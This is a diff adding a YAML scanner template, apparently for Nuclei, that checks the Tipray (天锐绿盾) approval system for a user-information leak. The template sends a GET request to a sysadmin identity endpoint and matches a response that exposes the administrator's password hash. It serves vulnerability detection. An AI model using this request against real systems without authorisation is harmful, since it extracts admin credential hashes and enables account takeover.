@@ -1,0 +1,32 @@
+id: poc-yaml-tipray-gsas-user-info-leak
+info:
+  name: 天锐绿盾审批系统 user 信息泄露漏洞
+  author: ProjectDiscoveryAI
+  severity: medium
+  tags: 信息泄露
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/trwfe/ws/identity/user/sysadmin"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - '"id":"sysadmin"'
+      - type: regex
+        part: body
+        regex:
+          - '"password":"([0-9a-z]{32})"'
+      - type: word
+        part: header
+        words:
+          - "application/json"
+      - type: word
+        part: body
+        negative: true
+        words:
+          - "<"
